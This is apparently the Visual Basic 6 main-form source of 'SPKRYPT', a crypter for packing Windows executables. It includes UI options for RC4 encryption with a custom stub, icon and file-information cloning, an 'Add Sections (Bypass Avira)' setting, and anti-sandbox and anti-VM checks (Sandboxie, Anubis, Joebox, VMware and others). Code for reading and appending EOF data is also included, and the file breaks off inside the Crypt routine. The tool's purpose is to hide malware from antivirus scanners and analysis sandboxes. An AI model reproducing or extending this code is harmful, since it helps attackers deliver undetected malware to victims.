VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.2#0"; "CODEJO~1.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "  SPKRYPT | Private version for: SpK"
   ClientHeight    =   6465
   ClientLeft      =   3405
   ClientTop       =   3510
   ClientWidth     =   12435
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6465
   ScaleWidth      =   12435
   Begin XtremeSuiteControls.ListView lvFiles 
      Height          =   5775
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   3495
      _Version        =   851970
      _ExtentX        =   6165
      _ExtentY        =   10186
      _StockProps     =   77
      BackColor       =   -2147483643
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      View            =   3
      GridLines       =   -1  'True
      FullRowSelect   =   -1  'True
   End
   Begin XtremeSuiteControls.PushButton cmdExit 
      Height          =   375
      Left            =   10440
      TabIndex        =   31
      Top             =   6000
      Width           =   1815
      _Version        =   851970
      _ExtentX        =   3201
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Exit"
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":16AC2
   End
   Begin XtremeSuiteControls.PushButton cmdCrypt 
      Height          =   375
      Left            =   3720
      TabIndex        =   4
      Top             =   6000
      Width           =   6615
      _Version        =   851970
      _ExtentX        =   11668
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Crypt"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":16BE0
   End
   Begin XtremeSuiteControls.GroupBox gBox1 
      Height          =   5775
      Left            =   3720
      TabIndex        =   3
      Top             =   120
      Width           =   8535
      _Version        =   851970
      _ExtentX        =   15055
      _ExtentY        =   10186
      _StockProps     =   79
      Caption         =   "         SPKRYPT Settings"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.GroupBox GroupBox2 
         Height          =   855
         Left            =   240
         TabIndex        =   38
         Top             =   3840
         Width           =   8055
         _Version        =   851970
         _ExtentX        =   14208
         _ExtentY        =   1508
         _StockProps     =   79
         Caption         =   "        Read EOF Data"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtREOF 
            Height          =   255
            Left            =   240
            TabIndex        =   39
            Top             =   360
            Width           =   7575
            _Version        =   851970
            _ExtentX        =   13361
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "EOF"
         End
         Begin VB.Image Image9 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":16CE2
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox1 
         Height          =   1095
         Left            =   4560
         TabIndex        =   32
         Top             =   1560
         Width           =   3735
         _Version        =   851970
         _ExtentX        =   6588
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "       Add Sections (Bypass Avira)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton s1 
            Height          =   255
            Left            =   3360
            TabIndex        =   35
            Top             =   720
            Width           =   255
            _Version        =   851970
            _ExtentX        =   450
            _ExtentY        =   450
            _StockProps     =   79
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":16F74
         End
         Begin XtremeSuiteControls.CheckBox chkSections 
            Height          =   255
            Left            =   240
            TabIndex        =   34
            Top             =   360
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Add Sections?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txtS1 
            Height          =   255
            Left            =   240
            TabIndex        =   33
            Top             =   720
            Width           =   3015
            _Version        =   851970
            _ExtentX        =   5318
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
         End
         Begin VB.Image Image8 
            Height          =   240
            Left            =   120
            Picture         =   "frmMain.frx":17088
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpClone 
         Height          =   1095
         Left            =   4560
         TabIndex        =   28
         Top             =   360
         Width           =   3735
         _Version        =   851970
         _ExtentX        =   6588
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "         File Information Cloner"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtClone 
            Height          =   255
            Left            =   240
            TabIndex        =   30
            Top             =   720
            Width           =   3135
            _Version        =   851970
            _ExtentX        =   5530
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for file to clone..."
         End
         Begin XtremeSuiteControls.CheckBox chkClone 
            Height          =   255
            Left            =   240
            TabIndex        =   29
            Top             =   360
            Width           =   2295
            _Version        =   851970
            _ExtentX        =   4048
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Clone File Information?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image7 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":172E9
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpIcon 
         Height          =   1215
         Left            =   240
         TabIndex        =   25
         Top             =   360
         Width           =   4215
         _Version        =   851970
         _ExtentX        =   7435
         _ExtentY        =   2143
         _StockProps     =   79
         Caption         =   "        Icon Changer"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtIcon 
            Height          =   255
            Left            =   240
            TabIndex        =   27
            Top             =   720
            Width           =   3735
            _Version        =   851970
            _ExtentX        =   6588
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for custom icon..."
         End
         Begin XtremeSuiteControls.CheckBox chkIcon 
            Height          =   255
            Left            =   240
            TabIndex        =   26
            Top             =   360
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Change Icon?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image6 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17416
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpExtra 
         Height          =   855
         Left            =   240
         TabIndex        =   21
         Top             =   2880
         Width           =   4215
         _Version        =   851970
         _ExtentX        =   7435
         _ExtentY        =   1508
         _StockProps     =   79
         Caption         =   "         Extra Stuff"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdHelpRADX 
            Height          =   150
            Left            =   3960
            TabIndex        =   37
            Top             =   360
            Width           =   135
            _Version        =   851970
            _ExtentX        =   238
            _ExtentY        =   265
            _StockProps     =   79
            Caption         =   "?"
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkPADX 
            Height          =   255
            Left            =   2520
            TabIndex        =   36
            Top             =   360
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Remove PADX"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton cmdEOFHelp 
            Height          =   135
            Left            =   2280
            TabIndex        =   24
            Top             =   360
            Width           =   135
            _Version        =   851970
            _ExtentX        =   238
            _ExtentY        =   238
            _StockProps     =   79
            Caption         =   "?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkEOF 
            Height          =   255
            Left            =   1320
            TabIndex        =   23
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "EOF Data"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkRPE 
            Height          =   255
            Left            =   240
            TabIndex        =   22
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Realign PE"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image5 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17539
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpEnc 
         Height          =   975
         Left            =   4560
         TabIndex        =   17
         Top             =   2760
         Width           =   3735
         _Version        =   851970
         _ExtentX        =   6588
         _ExtentY        =   1720
         _StockProps     =   79
         Caption         =   "          Encryption"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdGenKey 
            Height          =   255
            Index           =   0
            Left            =   3360
            TabIndex        =   20
            Top             =   600
            Width           =   255
            _Version        =   851970
            _ExtentX        =   450
            _ExtentY        =   450
            _StockProps     =   79
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":176B3
         End
         Begin XtremeSuiteControls.FlatEdit txtKey 
            Height          =   255
            Left            =   240
            TabIndex        =   19
            Top             =   600
            Width           =   3015
            _Version        =   851970
            _ExtentX        =   5318
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Key..."
         End
         Begin XtremeSuiteControls.CheckBox chkEncryption 
            Height          =   255
            Left            =   240
            TabIndex        =   18
            Top             =   240
            Width           =   1095
            _Version        =   851970
            _ExtentX        =   1931
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "RC4"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
            Value           =   1
         End
         Begin VB.Image Image4 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":177C7
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpStub 
         Height          =   1095
         Left            =   240
         TabIndex        =   14
         Top             =   1680
         Width           =   4215
         _Version        =   851970
         _ExtentX        =   7435
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "         Custom Stub"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtStub 
            Height          =   255
            Left            =   240
            TabIndex        =   16
            Top             =   720
            Width           =   3735
            _Version        =   851970
            _ExtentX        =   6588
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for custom stub..."
         End
         Begin XtremeSuiteControls.CheckBox chkStub 
            Height          =   255
            Left            =   240
            TabIndex        =   15
            Top             =   360
            Width           =   1575
            _Version        =   851970
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Custom Stub?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image3 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":178CC
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpAnti 
         Height          =   855
         Left            =   240
         TabIndex        =   5
         Top             =   4800
         Width           =   8055
         _Version        =   851970
         _ExtentX        =   14208
         _ExtentY        =   1508
         _StockProps     =   79
         Caption         =   "         Anti Methods"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.CheckBox chkVMware 
            Height          =   255
            Left            =   6240
            TabIndex        =   13
            Top             =   480
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti VMware"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkCWSandbox 
            Height          =   255
            Left            =   6240
            TabIndex        =   12
            Top             =   240
            Width           =   1575
            _Version        =   851970
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti CW Sandbox"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkVPC 
            Height          =   255
            Left            =   4200
            TabIndex        =   11
            Top             =   480
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Virtual PC"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkVBox 
            Height          =   255
            Left            =   4200
            TabIndex        =   10
            Top             =   240
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Virtual Box"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkJoebox 
            Height          =   255
            Left            =   2400
            TabIndex        =   9
            Top             =   480
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Joebox"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkAnubis 
            Height          =   255
            Left            =   2400
            TabIndex        =   8
            Top             =   240
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Anubis"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkThreatExpert 
            Height          =   255
            Left            =   240
            TabIndex        =   7
            Top             =   480
            Width           =   1695
            _Version        =   851970
            _ExtentX        =   2990
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti ThreatExpert"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkSandboxie 
            Height          =   255
            Left            =   240
            TabIndex        =   6
            Top             =   240
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Sandboxie"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image2 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":179E3
            Top             =   0
            Width           =   240
         End
      End
      Begin VB.Image Image1 
         Height          =   240
         Left            =   240
         Picture         =   "frmMain.frx":17B07
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.PushButton cmdClearList 
      Height          =   375
      Left            =   2640
      TabIndex        =   2
      Top             =   6000
      Width           =   975
      _Version        =   851970
      _ExtentX        =   1720
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Clear"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":17C0E
   End
   Begin XtremeSuiteControls.PushButton cmdAddFile 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   6000
      Width           =   2415
      _Version        =   851970
      _ExtentX        =   4260
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Add File(s)"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":17D2F
   End
   Begin XtremeSuiteControls.CommonDialog CloneDialog 
      Left            =   3600
      Top             =   1080
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog IconDialog 
      Left            =   3600
      Top             =   840
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog SaveDialog 
      Left            =   3600
      Top             =   600
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog StubDialog 
      Left            =   3600
      Top             =   360
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog CD 
      Left            =   3600
      Top             =   120
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'/==== APIs & Stuff ====/
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Const FileSplit = "ITSASPLIT"
Const L1 = "abcdefghijklmnopqrstuvwxyz"
Const L2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const L3 = "{[]}\*/-+1234567890,.-;:_'*~#!§$%&/()=?"

Private Sub chkClone_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtClone.Enabled = False Then
       txtClone.Enabled = True
       Else
       txtClone.Enabled = False
       End If
End Sub

Private Sub chkIcon_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtIcon.Enabled = False Then
       txtIcon.Enabled = True
       Else
       txtIcon.Enabled = False
       End If
End Sub

Private Sub chkPADX_Click()
MsgBox "When using this option, the crypted file will not be executable until you have clicked the 'Exit' button on the crypter", vbCritical
End Sub

Private Sub chkRPE_Click()

If chkSections.Enabled = True Then
s1.Enabled = False
txtS1.Enabled = False
chkSections.Enabled = False
chkSections.Value = xtpUnchecked
Else
s1.Enabled = True
txtS1.Enabled = True
chkSections.Enabled = True
End If
End Sub

Private Sub chkSections_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtS1.Enabled = False Then
       txtS1.Enabled = True
       s1.Enabled = True
       Else
       txtS1.Enabled = False
       s1.Enabled = False
       End If
       
       If chkRPE.Enabled = True Then
       chkRPE.Value = xtpUnchecked
       chkRPE.Enabled = False
       Else: chkRPE.Enabled = True
       End If
       
End Sub

Private Sub chkStub_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtStub.Enabled = False Then
       txtStub.Enabled = True
       Else
       txtStub.Enabled = False
       End If
End Sub

Private Sub cmdAddFile_Click()
        '/==== Browse for file ====/
        On Error Resume Next
        CD.CancelError = True
        CD.DefaultExt = ".exe"
        CD.DialogTitle = "Select file(s) to crypt"
        CD.Filter = "Executable files (*.exe)|*.exe"
        CD.ShowOpen
        
        '/==== Exit if no file is selected ====/
        If CD.FileName = vbNullString Then Exit Sub
        
        '/==== Add to ListView and check EOF (Yes / No) ====/
        Set lvFileSubs = lvFiles.ListItems.Add(, , CD.FileName)
        If Len(ReadEOFData(CD.FileName)) <> 0 Then
        lvFileSubs.SubItems(1) = "Yes"
        Else
        lvFileSubs.SubItems(1) = "No"
        End If
        
        '/==== Check FileSize ====/
        lvFileSubs.SubItems(2) = GetFileSize(CD.FileName)
        
        txtREOF.Text = rEOF(CD.FileName)

End Sub

Private Sub cmdClearList_Click()
        '/==== Clear the ListView (lvFiles) ====/
        lvFiles.ListItems.Clear
End Sub
Public Function rEOF(sInput As String) As String
  On Error GoTo err:
  Dim sB As String
  Dim n As Integer
  Dim sFB As String, sEh As String, sChar As String
  Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
  If Dir(sInput) = "" Then GoTo err
  lFF = FreeFile
  Open sInput For Binary As #lFF
  sFB = Space(LOF(lFF))
  Get #lFF, , sFB
  Close #lFF
  For n = 1 To 30
  sB = sB & Chr(0)
  Next
  lPos = InStr(1, StrReverse(sFB), sB)
  sEh = (Mid$(StrReverse(sFB), 1, lPos - 1))
  rEOF = StrReverse(sEh)
  Exit Function
err: rEOF = vbNullString
End Function
Public Function sEOF(sInput As String, sOut As String) As Long
  On Error Resume Next
  Dim sBuf As String
  Dim i As Integer
  Dim iFile As Long, lPos As Long, lPos2 As Long, lCount As Long
  Dim sFB As String, sEh As String, sChar As String, lsEOF As String, FB As String
  If Dir(sInput) = "" Then Exit Function
  If Dir(sOut) = "" Then Exit Function
  iFile = FreeFile
  Open sInput For Binary As #iFile
  sFB = Space(LOF(iFile))
  Get #iFile, , sFB
  Close #iFile
  For i = 1 To 30
  sBuf = sBuf & Chr(0)
  Next
  lPos = InStr(1, StrReverse(sFB), sBuf)
  sEh = (Mid$(StrReverse(sFB), 1, lPos - 1))
  lsEOF = StrReverse(sEh)
  Open sOut For Binary As #iFile
  FB = Space(LOF(iFile))
  Get #iFile, , FB
  Close #iFile
  Open sOut For Binary As #iFile
  Put #iFile, , FB & lsEOF
  Close #iFile
End Function
Private Sub cmdCrypt_Click()
        '/==== Check if file is selected ====/
        If lvFiles.ListItems.Count = 0 Then
        MsgBox "No file is selected.", vbCritical
        Exit Sub
        End If

        '/==== Variables ====/
        Dim AntiData  As String
        Dim StubString As String
        Dim hRes As Long
        Dim RC4 As New RC4
        Dim TotalString As String
        Dim i As Integer
        Dim Error As String
        Dim PathStub As String
        Dim sBuff(99) As String
        Dim F As Integer
        F = FreeFile

        '/==== Save Dialog ====/
